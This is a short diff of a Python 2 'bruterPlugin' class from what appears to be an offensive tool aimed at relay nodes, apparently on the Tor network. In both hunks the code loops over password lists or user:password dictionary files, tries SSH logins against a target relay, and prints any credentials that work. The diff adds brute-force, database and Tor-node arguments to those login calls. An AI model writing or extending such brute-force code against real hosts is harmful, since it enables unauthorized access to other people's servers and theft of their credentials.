@@ -108,7 +108,7 @@ class bruterPlugin(BasePlugin):
                     break
                 for passwd in passList:
                     try:
-                        if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
+                        if self.serviceConnector.performSSHConnection(relay, port, user, passwd, brute=True, databaseConnection=self.db, torNodes=self.torNodes):
                             print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                             stop_attack = True
                             break
@@ -130,7 +130,7 @@ class bruterPlugin(BasePlugin):
             for line in open(dictFile, "r").readlines():
                 [user, passwd] = line.strip().split(self.separator)
                 try:
-                    if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
+                    if self.serviceConnector.performSSHConnection(relay, port, user, passwd, brute=True, databaseConnection=self.db, torNodes=self.torNodes):
                         print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                         break
                 except:
